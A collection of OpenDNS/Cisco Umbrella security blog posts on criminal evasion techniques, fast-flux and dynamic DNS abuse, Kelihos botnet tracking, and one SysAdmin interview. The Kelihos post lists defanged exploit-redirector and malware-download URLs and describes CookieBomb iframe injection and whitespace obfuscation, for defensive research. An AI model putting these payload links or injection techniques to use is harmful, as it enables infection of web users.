{"website": "Cisco-Umbrella", "title": "How Bad Guys Hide Online, Part One", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/how-bad-guys-hide-online-pt-one", "abstract": "In part one of this two-part series, the OpenDNS Company Blog focuses on the common “bag of tricks” that criminals use to avoid detection online. Infosec experts often apply the phrase “know your enemy” when discussing the techniques used by malicious actors online. While every organization has its own unique threat model , the average sophistication level of financially-motivated attacks has increased in recent years. One of the reasons for the increase is the increasing availability of proven tools, infrastructure and operational techniques for carrying out successful attacks against business networks and endpoints. Math != Stealth Before talking about how bad guys hide their activity online, a brief word about applied cryptography: it won’t be discussed in detail, here. Encryption is a complex topic that is best left up to professional cryptographers. It’s also only a small piece of the puzzle when it comes to identifying would-be online attackers, who can be identified through a variety of methods before, during and after an attack. Obfuscation and Evasion Many modern information security systems have their roots in signature-based detection and blocklisting technologies that have been around for decades (antivirus being the most common example). To avoid detection, hackers rely on the ability to change malware signatures quickly in order to reuse the same piece of malware against a wide variety of targets. One of the primary methods of disguising malware signatures is through the use of crypters. As a previous post on the OpenDNS Security Labs blog outlines, crypters allow criminals to rapidly change malware files: These tools typically cut up the input file into pieces, encrypt them, and place them into another executable which has been specially crafted to reassemble the payload and have it run. These outer shells are updated multiple times per day to evade detection by security software, and many even employ server-side polymorphism on the malware repository, which means each individual victim will receive a distinct copy of the malicious file. It’s not hard to see why naive signature-based detection techniques cannot keep up with this style of distribution. Statis analysis of a Pushdo sample, courtesy of OpenDNS Security Labs Crypters have made it much easier for attackers to hide their malware from security solutions that rely on automated file signature matching. Essentially, the file signature is no longer based on the ability of a malware author to rewrite/recompile the code for each attack campaign, but on a third party specialist that sells crypter software, which can itself be reused. Since most financially-motivated crime tends to strives to compromise as many targets as possible (although there are exceptions), criminals have favored this method of disguising file signatures in recent years. Network-level obfuscation can also be accomplished through a number of methods to make an attacker’s traffic patterns and connections look random or disguise them as network traffic. From the same blog OpenDNS Security Labs blog post: Previous versions of Pushdo have used DNS smokescreens, URL path randomization, and DGA fall back techniques for obscuring command and control (C2) communication. Domain generation algorithms (DGAs) are another common method of making it difficult to detect malicious network connections. As detailed elsewhere on this blog, DGAs can create hundreds or thousands of domains that a machine checks daily, which can be used as command-and-control nodes for botnets or other infected machines. Generally, a combination of randomness and volume is used to disguise which domains are really being utilized for malicious communications. Both of these methods, however, do still leave a trail of clues that security researchers can follow. You can read about methods for defeating crypters and DGAs in the aforementioned Labs blog post and here . Old Fashioned OPSEC Do you want to pass a confidential message to a coworker that’s private and secure? First, walk over to them. Next, tell them your message, quietly. That’s it! No encryption or Tor Hidden Services required. OPSEC (operational security, in military parlance) is generic shorthand for the techniques people use to keep their plans or activities secret. Most OPSEC techniques can be decidedly low tech. For instance, sneakernets are one of the simplest ways of hiding your online activity — just stay offline. Accordingly, most of today’s online criminals try to keep activities like selling/purchasing crypters, renting time on botnets away from prying eyes, instead relying on Dark Web forums to carry out those activities. Other simple “operational hygiene” techniques are commonly used by bad guys to hid their activity, such as one-time use email addresses. For example, the use of overlapping email addresses for registering domains connected with the Angler exploit kit and Bedep botnet have led the research to link the these two pieces of malicious infrastructure. One of biggest developments of the last decade has been the specialization and professionalization of cybercrime. Today’s financially-motivated online criminals have an array of services, providers, and infrastructure that they can utilize to carry out attacks. A criminal might purchase malware from an online forum, an exploit kit to deliver the malware, rent time on a botnet to deliver command-and-control instructions to compromised machines . Sometimes, these services will be bundled into a single turnkey solution, which allows criminals to easily scale their operations and go after more targets. Based on the writing of security blogger Brian Krebs, it seems that one of the biggest OPSEC problems for today’s criminals comes from simply having to operate businesses that caters to (and compete with) other criminals. Krebs has written extensively about several incidents where criminals have hacked one another . Also, separation of providers makes it harder to keep OPSEC intact, every other “dumb customer” of a bulletproof hosting provider provides more information that infosec teams can use to zero in on the source of an attack. Dark Web forums also face a conundrum: in order to attract enough criminals to be useful, they still must be “known” to a certain subset of the criminal population. This very quality makes it difficult for these forums to avoid attracting attention from security researchers. Join the OpenDNS Blog again next week, when we speak with OpenDNS Security Labs researcher Anthony Kasza about how researchers are finding new ways to uncover malicious behavior online.", "date": "2015-09-11"},
{"website": "Cisco-Umbrella", "title": "Does Your Domain Have Bad Neighbors?", "author": ["Kevin Bottomley"], "link": "https://umbrella.cisco.com/blog/websites-and-bad-neighbors", "abstract": "What’s the big deal about bad neighbors? Bad neighbors are found in all types of places. Often times, when people begin the process of setting up a website or server (a.k.a. property), little research is done into exactly where they will be hosted at, who they are registering the domain name through, other sites nearby, and other subtle variables – such as a dedicated or shared server. Many decide to go with the inexpensive hosting provider to save costs, choose an inexpensive domain registrar, and use default packages to get their site rolling, all with little regard on the area they will be residing in. This is much like buying or renting a home with little or no insight into the neighborhood you are about to move into. While usually this can work out with little problem, one can end up moving into a less than reputable area of the Internet. The result can have a negative valuation on your site in many ways, from SEO to unexpectedly being put onto a blocklist due to who you share space with. Much like metropolitan areas throughout the world, the Internet has it’s own rough parts of town. These can include hosting providers who care more about money then their reputation, registrars who do not fully follow the rules set forth by ICANN’s Registrar Accreditation Agreement (RAA), domains that have been compromised without the owners knowledge and are being used for malicious purposes, or, on the flip side of that, known malicious domains hosting nefarious content by the owner for the purpose of infecting visitors computers for various reasons. All of these can affect you or your company’s presence on the web in different ways, and usually not for the better. How does it all connect together? On the outset, your domain name is resolved to a Internet Protocol (IP) address through the use of the Domain Name System (DNS). Without this, you would have to remember a string of numbers every time you wanted to visit a site, and those numbers don’t always stay the same , adding some complication to the process. This usually is not a problem for bigger companies that pay for a dedicated IP, but for smaller budgets, this is not always an option. IP addresses that send spam, host malware, or are Command and Control (C&C) servers for botnets can end up on so called blocklists. When this happens any information sent from them will no longer make it to the intended target and will likely be inaccessible by inbound traffic. This is usually done for the greater good of the users of the Internet, but can be bad if your IP address ends up on one of these lists, even though you have not done anything wrong yourself. Getting your product to customers or message across to readers can become next to impossible if they can not get to you. All of these IP addresses are a subset of a bigger sphere called the Autonomous System (AS). These AS’ are a set of routes that are distributed among network operators so that every computer can talk to every other computer that is reachable on the Internet. Above the AS’ come Autonomous System Networks (ASNs) that are run by ISPs and are registered officially and identify each network on the Internet. These AS’ represent the city in which you are going to live in. For a more detailed breakdown of what an AS is, you can read this OpenDNS whitepaper here . Why does it matter? Much like any city, there is always some extent of crime going on. Obtaining an IP address is essentially nothing more than then moving into a region of a city. Depending on the neighborhood, the value of your property will go up or down given what is going on around it. Bad neighbors can greatly cause the value of your property to go down. This is where a little research can go a long way in deciding if you will be affected by SEO page rankings, potential for compromise, getting blocklisted due to someone hosting malicious software on the same server/IP as you, getting a reused IP that once was considered to be dangerous and blocked by numerous companies, and more. Who can help me? Attempting to figure this out all on your own can turn into quite the daunting task. Luckily, I’m here to help you. In my next blog post I will show how some of the powerful tools we use here at OpenDNS can make this task much easier by narrowing down some of the more unruly parts of the web using both Investigate , and our newly released open-source visualization tool, OpenGraphiti .", "date": "2014-08-21"},
{"website": "Cisco-Umbrella", "title": "Real Time Monitoring of Kelihos Fast Flux Botnet: A Case Study for APWG eCrime 2013", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/real-time-monitoring-kelihos-fast-flux-botnet-case-study-presented-apwg-ecrime-2013", "abstract": "Last week’s APWG eCrime 2013 conference marked the 10th anniversary of the the Anti Phishing Working Group. What better a place to host this special event than our great city of San Francisco? The conference drew crowds from academia, industry, and the governing bodies of the Internet; there were presentations from RSA, PayPal, Microsoft, UC Berkeley, CMU, IID, StubHub, ICANN, and the .org, .pl, .jp, .co and .uk registries, among others. OpenDNS was at the scene with two presentations: our CTO, Dan Hubbard, presented on Monday Sep 16th on “Achieving Zen with a new Security Venn” and I presented a research case study on “Real time Monitoring of fast flux botnets using DNS” on Wednesday Sep 18th. The Talk In my presentation, I discussed a 7-month study of the Kelihos fast flux botnet from a DNS perspective. This involved real-time monitoring and detection of Kelihos domains using both our recursive and authoritative DNS traffic. Some of the highlights of the talk were the monitoring methodology used: it first carefully defines a profile of domains to monitor, then watches the emergence of similar domains in real time. I also discussed the Kelihos domains’ TLD distribution, botnet country distribution, statistics on the daily lifecycle of the botnet, daily detected domains, lifetime of domains and hosting IPs, and malware payload delivered. I also described the valuable collaboration with the research group MalwareMustDie, which is paramount to swiftly take these domains down right after they are blocklisted in our systems to protect our customers. For more details, you can consult the slides here . Also, the final version of the submitted paper will be available soon in the conference proceedings. Below, you can also see a world map with a sample of the botnet’s infected hosts prepared by my colleague Thibault (check his recent blog ). The Conference I attended several good talks. A recurring theme was the need to streamline the collaboration between industry, law enforcement, ICANN, registries, registrars and regional CERTs and ISPs. This is important to facilitate and speed up the takedown of malicious domains, and hosting infrastructures on one hand, and the prosecution of the criminals behind these operations on the other hand. Cybercrime increases in sophistication at a staggering speed, and shows no sign of slowing down, so if the laws and policies don’t follow suit, then we are losing the battle. A notable talk under this theme was “Put the F@ckers in Jail, part Deux! Direct-to-Prosecutor Referrals” by StubHub. I also found the panel discussion “ccTLD Abuse Management Protocols and Practices” quite insightful which was moderated by ICANN, and featured CERT/NASK Poland (.pl registry), PIR (.org registry), Japan Registry Services (.jp registry), and Nominet (.uk registry). For instance, CERT/NASK described how their new team of lawyers was able to use two principles to push local law enforcement into action: “The general principles of civil law, where one is responsible for any harm caused by his actions or negligence.” NASK was compelled to take action against malicious domains or risk being held liable for their activities. “To hold claims against NASK, a domain owner would have to prove his losses, therefore criminal charges against the owner would stall the civil dispute.” The owners of malicious domains could only take legal action against NASK by demonstrating legitimate losses—which would be impossible to do until the criminal case was completed. NASK was able to take over and sinkhole 82 domains of the Virut botnet in early 2013 and several hundred more in subsequent operations. Details are described here and information on other operations can be found here . Protecting Our Customers: a Real Time Detection Framework of Malicious Domains The real time monitoring/detection system I described in the talk has been used on a larger scale to daily detect domains involved in various malicious campaigns. For example, I tailored the system to monitor fast flux domains of different families (domains that share same IP pool, TTL value, etc), so in addition to the daily stream of Kelihos domains recognizable by their TTL=0, the system has monitored other FF domains with TTL=150, 300, 1440, used for other malicious purposes. For example, TTL=1440 is typical of certain spam, scam, casino, and pharmacy domains. This more generalized real time monitoring framework detects everyday, hundreds to a few thousands of domains serving various Exploit kits, or used as CnCs for trojans such as Sality, and Caphaw; ransomware CnCs such as CryptoLocker, Reveton, Urausy, and browser-based ransomware domains, etc. The accuracy of such profiling of domains stems from the fact that, domains, and IPs are often reused, recycled, rented, and borrowed among malicious campaigns and criminal organizations. These detected domains are confirmed malicious as they generally combine bad IP reputation, recent registration, a surge in traffic volume, similar name patterns, and 0-day age (as they are detected in real time in our traffic). Below is an example of an Exploit kit serving domain detected a few hours earlier by our real time system. More examples of such discovered Exploit kit domains that we blocked to protect our users then shared with the security community can be found here . Because of the worldwide visibility of OpenDNS into recursive and authoritative DNS, our real time system constitutes an early detection layer for our customers, and should be part of a defense-in-depth approach to security, to face the barrage of increasingly sophisticated attacks.", "date": "2013-09-24"},
{"website": "Cisco-Umbrella", "title": "On the trail of malicious dynamic DNS domains", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/on-the-trail-of-malicious-dynamic-dns-domains", "abstract": "Dynamic DNS is a useful technology that allows a domain name to point to Internet resources hosted on changing public IP addresses. Consider an individual or small business with a dynamic IP who needs to provide consistent content or services publicly advertised to the outside world via a domain name (e.g. website, FTP server, mail server, game room, webcam monitoring, etc). That’s where dynamic DNS helps out. Typically, these customers use the IP assigned to them by their ISP, and every time their IP changes, they notify their dynamic DNS provider to update its name servers so that the customer’s domain points now to the new IP. The notification happens through a client software installed on the customer’s router/computer or via an HTTP restful API. One such client software is DNSOMATIC by OpenDNS. Unfortunately, the convenience of dynamic DNS did not go unnoticed by miscreants, who have been abusing free, dynamic DNS to perform various attacks such as large-scale malvertising, and targeted spear-phishing, which both resulted in drive-by downloads, and use it for botnet C&C. For attackers, using dynamic DNS constitutes another agile evasion technique against IP blocklisting. It also allows them to deliver malicious payloads from constantly-changing hosting IPs, be it infected individuals’ computers or compromised public websites. To circumvent domain blocklisting, attackers can also use randomly-generated disposable subdomains under the dynamic DNS domain to point to the next hop in a redirection chain or to the final malware hosting IP. This seems similar to fast flux, although from a definition standpoint they are different. For dynamic DNS, the dynamic IP is supposed to fall in the IP range of the ISP (1 or a few ASNs), whereas, with fast flux, a domain will be pointing to an increasing number of different IPs scattered across numerous ASNs and multiple geographical locations. Additionally, for dynamic DNS, the authoritative name servers for a dynamic DNS domain physically belong to the dynamic DNS provider, whereas with fast flux, double fluxing is possible where the name servers can be made point to constantly changing IPs of physical hosts located in disparate ASNs and countries.  In practice, dynamic DNS domains map to a much smaller set of IPs than fast flux. In this blog, we discuss the relationship between dynamic DNS domains and malware as we see it through mining our large DNS data sets. This can also give some perspective on how to address the problem of rogue dynamic DNS domains. Dynamic DNS analysis There are plenty of dynamic DNS providers, both free and for a cost. One good list of them is available here . Dynamic DNS providers offer users to either register domains (2LDs), or subdomains (3LDs) under a predefined set of domains (2LDs). For instance, changeIP.com has a list of 155 domains, under which a user can freely register any subdomain of his choice (if it is available). For example, they have 1dumb.com and 2waky.com as pre-registered domains, and a user can register the hostnames johndoe.1dumb.com or myhomebusiness.2waky.com. changeIP also offers to users to register a domain under the following TLDs .com, .net, .info, .org, .biz, or .us. This latter choice requires an annual registration fee though. Similar offers are available from other providers like no-ip.com, afraid.org, Dyn.com (formerly known as DynDNS), etc. The common practice for attackers is to abuse the free subdomains. For this study, we are interested in evaluating the amount of dynamic DNS domains we see in our daily authoritative DNS traffic and the percentage of malicious domains within, and also find out which subdomains are the most frequently abused. First, we collect a sample of known malicious dynamic DNS domains, then, we compile a list of known pre-registered domains offered by a few dynamic DNS providers. For the malicious sample, the dynamic DNS providers that are mostly used are sitelutions.com, noip.com, changeip.com, and dnsdynamic.org. For the general list, we select known dynamic DNS providers such as: changeip.com, dnsdynamic.org, noip.com, freedns.afraid.org, dyndns.com, sitelutions.com, and 3322.org. These samples are not exhaustive as there are a lot more dynamic DNS providers (and more of them are abused). Some dynamic DNS providers are not limited to offering dynamic DNS services and act also as regular domain registrars, so a domain registered with a dynamic DNS provider and using its name servers might not necessarily be using the dynamic DNS service. We think, however, that these samples are representative enough for the sake of the analysis. Next, we resolve the NS (name servers) of all domains in both samples. This list of name servers will be used to filter out the daily logs to identify domains using dynamic DNS. The logic here is that if we already know about a set of dynamic DNS domains, we can identify their name servers, and any new domain that uses these latter name servers will be assumed to be a dynamic DNS domain. The name servers from the general list give a trend on the percentage of total dynamic DNS domains in daily traffic, whereas, the name servers from the malicious sample provide an idea on the dynamic DNS traffic most likely to be malicious. The name servers associated with the sample of malicious dynamic DNS domains are: ns[1-3].changeip.org, ns[1-5].changeip.com, ns[1,2].dnsdynamic.org, nf[1-5].no-ip.com, and ns[1-5].sitelutions.com. In the next step, we collect sample authoritative DNS logs from three resolvers in London, Ashburn and Singapore, where we have for every domain, its associated authoritative name server(s). For each day, we collect a sample of  1,518,782 domains on average with their name servers data. We collect logs for a week, then for each day, we identify those domains whose name servers fall within the list of name servers of dynamic DNS providers. Finally, we compare the identified dynamic DNS domains against our blocklist (which is constantly updated with new data), and we show the results in the figures below. For the sake of this discussion, we call sortecielo.2waky.com a hostname, or subdomain or 3LD and 2waky.com a domain or 2LD. We can see in the figures, that there are 30,000+ dynamic DNS hostnames (3LDs) observed daily in the sample authoritative DNS traffic, and 3000+  corresponding domains (2LDs). For the same period, out of the same daily domain sets, we identify 1400+ malicious hostnames, and 200+ associated domains every day. This gives an idea about the density of the associations between a domain and its “children” subdomains. Top abused dynamic DNS domains In the following tables, we show the top 20 domains observed in daily traffic over a week as well as the top 20 domains used for malicious purposes over the same period. The counts next to the domain represent the number of hostnames under that domain. For example, on the first day, disqus had 18,294 hostnames of the form subdomain.disqus.com In the next table, we show side by side, for a single day the top 20 dynamic DNS domains in general traffic and those that had malicious hostnames. We indicate in red, those domains that are present in both top malicious domains and top popular domains in a daily DNS traffic i.e. no-ip.org, no-ip.biz, no-ip.info, hopto.org, dlinkddns.com, myftp.org, myvnc.com, myftp.biz, and us.to. What is noteworthy is that some popular dynamic DNS domains for general legitimate uses are also the top ones abused for malicious purposes. This makes blocking the entire domain a little tricky as that would deny visibility to a lot of legitimate content. Notice that the dynamic DNS provider no-ip.com is the most used one for both legitimate and malicious intent. The domains no-ip.org, no-ip.biz, no-ip.info, hopto.org, myftp.org, myvnc.com, and myftp.biz all use no-ip name servers. The right hand table for top malicious domains is illustrated at the end of this blog as a graph representation. [top 20 domains in general traffic on the left, and top 20 malicious domains on the right] In the next table, we show the percentage of malicious usage of hostnames under each domain. For example, 56.71% of the 3LDs under hopto.org are malicious. Clearly, some domains are heavily used for malicious purposes. Below, we show an illustrative graph of the mapping of hostnames to domains taken from the list of detected malicious dynamic DNS domains of one day. The largest connected component on the top left corner is that of the domain hopto.org which has 245 malicious 3LDs associated with it, e.g. spilak.hopto.org, arasispodmoonf.hopto.org, 1n12.hopto.org, etc. On the right of hopto.org is the cluster of no-ip.org with 125 malicious 3LDs, then no-ip.info on the right with 103 hostnames, etc. We further took a sample of hostnames under hopto.org, and we determined that they were used to serve urls for Fragus Exploit kit, Best Pack Exploit kit, Incognito Exploit kit, Java and PDF exploits, leading to Trojan Fake AVs downloads. They were also used as CnC for W32/Dorkbot-EK, Rogue:Win32/Winwebsec, Trojan-Ransom.Win32.Mbro.ysw, IRC botnets, and also to serve phishing urls. In another sample, we observe that malicious dynamic DNS domains are massively associated with Blackhole exploits kit, Neosploit exploits, PDF exploits, and other exploits leading to the delivery of rogue antivirus, trojans, Backdoor SDBot, etc. It is worth mentioning that it is difficult to trace back the registration information of dynamic DNS domains that are in the form of subdomain.[predefined domain].tld because the whois information only records the registration information of the domain (the 2LD). Note: The tools and platform I used for this study are our Hadoop dev cluster , Apache Pig , Python, and Unix shell tools (sed, awk, grep, etc).", "date": "2013-04-15"},
{"website": "Cisco-Umbrella", "title": "SysAdmins – In Their Own Words", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/what-is-a-sysadmin", "abstract": "This Friday, July 26th, we’re joining companies around the world in celebrating SysAdmin Appreciation Day . If you’ve been following along on social media, you know we do it in a big way. But what IS a System Administrator? Calling someone a “Network Ninja” doesn’t really answer the question, and google usually spits out a series of technical jargon that takes hours to wade through. As is so often the case, we went to the experts for answers – SysAdmin bloggers from around the net who’ve seen it all: Philip Sellers, Tech Talk Matt Simmons, Standalone SysAdmin Tom Limoncelli, Everything SysAdmin We asked each of them a few questions about what it means to be a SysAdmin, as well as the ins and outs of the position. Read their answers below – and remember to thank your SysAdmin this Friday! (Gift suggestions at the bottom!) 1.) What does being a SysAdmin mean to you? TL: Being a SysAdmin means keeping the world running. As “software eats the world”, we’re the people that keep that software going. MS: Our world is full of complexity. The world of IT, doubly so. Being a system administrator means taking that complexity and harnessing it and turning disparate pieces of unrelated technology into a useful, coordinated infrastructure. It means making something emerge where there used to be nothing. PS: To me, it’s kind of like being a puppeteer – we’re behind the scenes pulling the strings to make things work but people rarely get to see us. 2.) What is the best/worst thing about being a SysAdmin? PS: The best and worst thing about being a SysAdmin is that the technology is constantly changing. It means we never stay still and our landscape is constantly moving. We’re always chasing a moving target. We have to adapt and change – it’s both exciting and exhausting, but I think most SysAdmins wouldn’t have it any other way. MS: The best thing about being a SysAdmin is being a person or a part of a team that makes a very real difference to the benefit of the organization. There is probably no other position in the company with the kind of responsibility and ability to affect change – both good and bad – with such immediacy. It’s a position of responsibility, and doing it right is a reward unto itself. The worst thing about being a SysAdmin is that nearly none of what I previously mentioned is widely recognized outside of our profession. We are often seen as maintenance workers when, in fact, we manage the entire lifecycle of business critical processes. To succeed in this profession and not get burned out, you need to maintain a healthy dose of internal motivation. If you wait around for praise, you’ll die on the vine. Let the successful job be its own reward. 3.) What made you become a SysAdmin? PS: For me, it’s really a lot of things that came together. I enjoy solving problems. I became obsessed with computers as a teen and got my first taste of systems administration during high school helping to diagnose and fix problems on the school’s Token Ring network. I continue to enjoy getting hands-on with new technology. My dad taught me how to troubleshoot while growing up on the farm and I think that skill, more than anything else, is why I ended up as a SysAdmin instead of another IT career. MS: Like most SysAdmins, I kind of fell into it. I worked technical support for an ISP and I was the most advanced Linux user in the (small) company, and I would help the admins out when they ran into problems from time to time. Eventually there was an opening in the team and I was made the “Junior Network Administrator”. I worry sometimes that the path that allowed me in won’t stay open for much longer. When I first got into system administration, the “state of the art” was considerably less sophisticated than it is now. I snuck in because I ran the same operating system on my laptop as we did on our servers – Slackware Linux. Now, you need to be more than a command line jockey to be a good admin. You need to know configuration management, programming, as well as most of the things you used to need to know. The increasing layers of abstraction in play adds to the list of things we need to know even as it removes the boring work we used to spend time on. TL: I became a sysadmin because I always loved learning the deep internals of any computer system I owned. A side-effect was that I could debug problems better than most people. However, what kept me being a system administrator is my love of operations and figuring out how to improve operations: either by automation or improving processes. I love automating real-world system administration tasks. I REALLY love finding that a process is broken due to a people or process problem, getting all the stakeholders together to discuss it, and getting consensus on how to fix the problem in the future. The big wins are when people get out of their silos and talk with each other. 4.) Why don’t people appreciate SysAdmins like they should? PS: Few people really know what a SysAdmin does day to day. Most of what we do as SysAdmins is hidden from their view. People don’t see the work we do to architect and design systems that minimize problems. People don’t see the complexity that we deal with on a daily basis – complexity that seems to grow constantly. People don’t see the hours we devote to working through problems step by step until we find the root cause and fix it. MS: The most commonly stated reason is that we are the “plumbers of the business”, and people only think about us when something breaks. I think that’s a pretty cynical outlook, but not entirely wrong. The bigger issue is that we, as IT professionals, are the “odd bird out” in business. We speak a different language, we use tools that no one else in the business does, and we’re generally thought of as a necessary evil because of this. The onus is on us to change this. We all need to learn to speak “business” better than we do. We have a lot to offer; more than the business knows – even more than we ourselves know. The number of services we can offer the business to help them run better are barely being tapped. Getting better at what we do doesn’t just mean being more technically proficient. It means doing more with what we’ve already got, and by working with business leaders to accomplish organizational goals, we can make sure that in the future, we’ll be recognized and valued more than we ever have been in our history. TL: Most people don’t know sysadmins exist. If they do, they confuse system administration with technical support. While many sysadmins spend a lot of their time doing technical support, that’s only because their organization has not grown to be large enough to have dedicated technical support people. In the future, system administrators will spend zero time doing front-line technical support. Devices will self-manage (at least to the point where problems with them are of a tech support nature) and system administrators will be operating services and the infrastructure that supports those services. 5.) What gift would you like for SysAdmin Appreciation Day? PS: I’d like some home lab equipment or an AMEX gift card with no limit. MS: Personally, I’m a big fan of space stuff. I’ve currently got a geek crush on Virgin Galactic and SpaceX as companies. If I didn’t already own it, I think a great present would be a copy of Kerbal Space Program (a really fun space program simulator). SysAdmins are all different, so you should really talk to your admin before going out and getting a present. Check out the stuff on their desks if you want to do it low key, but that being said, I’ve never seen anyone turn down a gift card to ThinkGeek. TL: The best gift I could get is time. There is nothing more valuable. That’s why I wrote a book on time management for system administrators . Yes, it may help them get more done at work, but my hope is that it will help them find ways to get enough done at the office that they can re-claim the 40-hour work week and spend more time at home with family (or family or choice) and friends. Therefore the perfect gift for me would be a day off!", "date": "2013-07-24"},
{"website": "Cisco-Umbrella", "title": "Tracking Versatile Kelihos Domains", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/tracking-versatile-kelihos-domains", "abstract": "Previously, we discussed how we regularly monitor our DNS traffic for malicious fast flux domains. One notable family of fast flux domains that we see every day are the “Kelihos” domains: A steady stream of DGA-like .ru domains (occasionally .com or .us), freshly registered, resolving to a single IP with a TTL of zero, and whose name servers are also fluxing with a TTL of zero. These domains have been covered numerous times recently [3] and been the subject of multiple takedowns [5] , but despite this publicity and efforts, their malicious usage has not abated. We observe that these domains are used for at least three purposes: as redirectors for Blackhole and Red kit exploit kits, as malware dropping domains for diverse trojan specimens (mainly the Kelihos trojan), and as CnC, appearing in the network traffic of trojan samples already installed on infected machines. In this blog post, we’ll take a look at a few such domains from our perspective, show how they serve multiple purposes, and describe a few live cases of their malicious usage. Notice that all domains mentioned in bold in the tables are live at the time of this writing. Domains’ activity in trojans’ traffic: In the table below, we show a sample of recent .ru domains that were reported in the network communications of known trojans. We detect these domains in our DNS traffic either a few days before or on the same day that a related malware analysis report is published. Notice, the last two domains registered on July 11th stayed dormant for about 10 days, then started being DNS-active and were reported in samples’ reports. As of this moment, they are no longer resolving. Domains’ usage as trojan downloaders: We now show a sample of domains used as Kelihos payload downloaders via exploit kit infections. At the time of this writing, these domains are live, as are the payload URLs. Domains’ usage in Iframe injections: In the following table, we inspect another sample of “Kelihos” domains. These domains are used as Exploit redirectors in hidden iframe injection attacks against the listed web pages. At the time of this writing, many of these web pages are still compromised (several may have been cleaned or no longer resolve, or their Exploit landing domains may have stopped resolving). This list is just a small set for illustration purposes as we counted tens of such infected “innocent” sites still live (a number expected to reach the hundreds), with more systematically infected every day. The last domain of the table has been suspended, but we are showing it as we will discuss it in a following example. Commonly, multiple pages of a website are infected simultaneously – and some webpages have the same iframe injection block replicated several times across the page (likely to maximize the chance that the malicious javascript is executed when the page loads). These blocks point to one specific exploit landing domain, although they could also point to several different domains. Moreover, on the same compromised page, the redirection url changes from one visit to another. Let’s take the example of hxxp://cimplerd.com/essie/. On this page’s source code, we observe some legitimate javascript loading code at the top, followed by a large number of white spaces that the attacker most likely injected as a “simplistic” obfuscation ploy – so that if a human tries to hastily inspect the source code, the malicious code following the white spaces does not show in the screen window. Following the white spaces, there are two iframe injection blocks that redirect to hxxp://abmisgaz.ru/count2.php and hxxp://ycsycxyd.ru/count29.php. These iframe injection blocks also feature the CookieBomb attack that we will discuss in the next section. The second block injection attempt failed though, as it appears truncated in the webpage screenshot. Notice also how the injected javascript blocks are not obfuscated. Cookie bomb/iframe injection attack example: By checking the compromised pages, we observed that most of the iframe injection attacks are actually “CookieBomb” javascript attacks. The “CookieBomb” attack is a recent twist on the hidden iframe injection, where the ensuing redirection or infection is made conditional upon the possession of a cookie. MalwareMustDie first described it in a fantastic article, also providing a PoC [8] [9] . Briefly, the idea is that if you enabled cookies in your browser and you visit a compromised site, the injected javascript will check if you hold a certain cookie – and will create one for you if you don’t. Subsequently, the .php code on the landing page will check for the cookie,  and depending on what the attacker set the php up to do, it could further redirect you to another site, or drop the malware right onto your machine, etc. In the image below, we can see an example of a CookieBomb code block: We also observed that some webpages were infected multiple times with this attack; for example, hxxp://www.scouts108.org.mx/index.php had 9 injected exploit redirection/CookieBomb code blocks (with 9 redirection URLs) scattered across the page. These blocks pointed to 3 distinct exploit redirection URLs overall. The URLs at the time of analysis were: hxxp://ycsycxyd.ru/count29.php hxxp://ycsycxyd.ru/count29.php hxxp://jibnikek.ru/count29.php hxxp://zofbeqve.ru/count2.php hxxp://jibnikek.ru/count29.php hxxp://ycsycxyd.ru/count29.php hxxp://ycsycxyd.ru/count29.php hxxp://ycsycxyd.ru/count29.php hxxp://jibnikek.ru/count29.php This could likely be the result of an automated script maliciously loaded on the hosting server that attempts to infect, in bulk, as many websites (and webpages) as possible that are hosted on the same server. However, this mass infection of web pages can be counterproductive for the bad guys (and good for us) as the injected javascript often fails to properly load and does not lead to the final drive-by malware download. We also noticed that compromised websites are multi-national, observing websites from Mexico, Peru, Russia, Poland, Turkey, India, and Thailand, etc. This could indicate that the bad guys target their “iframe injection” infections against sites in bulk, regardless of their origin, where these sites could have vulnerabilities in their web server setup, or whose administrative FTP credentials were leaked or purchased, etc. The end goal here is to infect as many user machines as possible and harvest the most accounts and personal data. Obviously, the attacks could also be targeted against a specific population or a business group. Dual purpose domains: We also observed that a lot of “Kelihos” domains are recycled for multiple uses: exploit redirectors and trojan droppers among them. Let’s take the example of powerwik.ru. At the time of this writing, this domain has been used as exploit redirector: hxxp://powerwik.ru/count3.php injected for example in this site http://www.bth-avocats.com/, and as a kelihos payload downloader with the following URLs: hxxp://powerwik.ru/userid2.exe, and hxxp://powerwik.ru/rasta01.exe. Below are the virustotal analysis reports of these two payloads: https://www.virustotal.com/en/file/db6d4312cd17fe158002329eda2e1e76a8cf13a39857e29caa5052b8f5d93e14/analysis/1375057453/ https://www.virustotal.com/en/file/411e66f30c64b35a2862b65e9c72a5f6757fcd014d2a6fa1a57ef4cc733e92f4/analysis/1375057548/ The geography of the infections: We will now discuss an interesting observation related to the geography of the client IPs querying Kelihos domains as we see it from our DNS traffic. Let’s take the example of afau.gajkukuc.ru: this domain shows a surge in DNS traffic between 10pm and 12am UTC on the night of July 24th. We checked the client IPs that looked up this domain, and display their country distribution in the map below. Notice the high concentration of clients in Turkey (next are the US, Canada and Mexico). We speculate that either users in Turkey were targeted by a spam campaign leading to afau.gajkukuc.ru (as an Exploit redirector or payload downloader), or that several Turkish speaking websites were compromised with iframe injections also leading to afau.gajkukuc.ru. [load-javascript slug=”kelihos-clients-ips-map”] We observe this behavior with other domains, for example: ca595.ximxamli.ru. This domain shows a spike of DNS queries between 6 and 8am UTC on July 24th from client IPs highly concentrated in Vietnam and Turkey. Multi-layer evasion: To summarize, we observe that the attackers use randomness at several levels to evade detection and blocklisting: 1. The redirection URL changes between consecutive visits to the same compromised page. 2. The domain names (2LD) are randomly generated, as are the subdomain names (3LD). 3. The domains resolve to a single IP with a TTL=0, this in itself tries to simulate a random DNS resolution. We monitor the total number of unique IPs, and can confirm this number is continuously growing. 4. The “Kelihos” domains are wildcard domains. If you try to resolve a hostname formed by prepending a random string to the domain name, you will get a successful resolution. This seems like an artifact that serves the random generation of subdomains. We presume that the automated script installed on an infected server uses this artifact to generate new random Exploit landing urls, (i.e. the targets of the iframe injection blocks) or payload downloading URLs.", "date": "2013-07-30"},
